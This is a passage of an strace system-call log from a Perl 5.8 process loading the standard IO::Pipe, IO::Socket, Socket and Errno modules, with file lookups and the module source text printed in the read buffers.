\'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
6692  07:15:04.976328 _llseek(6, 3425, [3425], SEEK_SET) = 0
6692  07:15:04.976346 _llseek(6, 0, [3425], SEEK_CUR) = 0
6692  07:15:04.976357 close(6)          = 0
6692  07:15:04.976382 stat64("/etc/perl/IO/Socket.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.976396 stat64("/etc/perl/IO/Socket.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.976410 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.976424 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.976438 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.976452 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.976466 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.976478 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.976492 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.976504 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.976518 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.976531 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
6692  07:15:04.976553 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
6692  07:15:04.976568 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe790e8) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.976584 _llseek(6, 0, [0], SEEK_CUR) = 0
6692  07:15:04.976632 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
6692  07:15:04.976971 stat64("/etc/perl/Socket.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.976987 stat64("/etc/perl/Socket.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.977001 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.977014 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.977028 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.977041 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.977055 stat64("/usr/lib/perl5/Socket.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.977068 stat64("/usr/lib/perl5/Socket.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.977081 stat64("/usr/share/perl5/Socket.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.977121 stat64("/usr/share/perl5/Socket.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.977137 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.977164 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
6692  07:15:04.977184 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
6692  07:15:04.977199 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78c38) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.977210 _llseek(8, 0, [0], SEEK_CUR) = 0
6692  07:15:04.977228 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
6692  07:15:04.977661 brk(0x8239000)    = 0x8239000
6692  07:15:04.977881 read(8, "", 4096) = 0
6692  07:15:04.977897 close(8)          = 0
6692  07:15:04.977983 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
6692  07:15:04.978009 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
6692  07:15:04.978035 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
6692  07:15:04.978050 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
6692  07:15:04.978083 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
6692  07:15:04.978084 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7de8000
6692  07:15:04.978084 mmap2(0xb7ded000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7ded000
6692  07:15:04.978084 close(8)          = 0
6692  07:15:04.978630 brk(0x825a000)    = 0x825a000
6692  07:15:04.978780 stat64("/etc/perl/Errno.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.978797 stat64("/etc/perl/Errno.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.978843 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.978875 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.978890 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.978903 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.978918 stat64("/usr/lib/perl5/Errno.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.978930 stat64("/usr/lib/perl5/Errno.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.978944 stat64("/usr/share/perl5/Errno.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.978956 stat64("/usr/share/perl5/Errno.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.978969 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.978982 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
6692  07:15:04.979004 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
6692  07:15:04.979018 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78c38) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.979030 _llseek(8, 0, [0], SEEK_CUR) = 0
6692  07:15:04.979050 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
